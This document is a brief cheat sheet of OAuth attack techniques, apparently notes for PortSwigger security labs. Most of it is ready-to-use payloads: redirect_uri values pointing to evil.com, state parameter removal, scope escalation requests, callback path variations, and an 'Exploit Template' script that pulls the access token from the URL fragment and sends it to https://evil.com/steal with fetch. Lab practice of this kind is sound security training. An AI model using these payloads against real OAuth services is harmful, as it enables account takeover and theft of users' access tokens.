# OAuth Attack Techniques

## PortSwigger Lab Solutions

### Lab: OAuth authentication bypass via implicit grant
**Approach**: Token in URL fragment can be stolen

### Lab: OAuth account takeover via redirect_uri
**Approach**: Change redirect_uri to attacker-controlled URL

## Common OAuth Attacks

### 1. Open Redirect in OAuth
```
# Change redirect_uri to attacker site
/oauth/authorize?redirect_uri=https://evil.com/callback
```

### 2. State Parameter Bypass
```
# Remove or modify state parameter
/oauth/callback?code=xxx&state=
# or reuse state from previous flow
```

### 3. Token Interception (Implicit Grant)
```
# Token in URL fragment (#)
/callback#access_token=xxx
# XSS on callback page can steal token
```

### 4. Scope Escalation
```
# Request additional scopes
/oauth/authorize?scope=openid profile email admin
```

### 5. Redirect URI Manipulation
```
# Test variations
/callback → /callback/../evil
/callback → /callback?evil=1
/callback → /callback/
/callback → /CALLBACK
```

## Exploit Template (XSS + OAuth)
```html
<script>
// If callback page has XSS
var token = window.location.hash.split('access_token=')[1];
fetch('https://evil.com/steal?token=' + token);
</script>
```
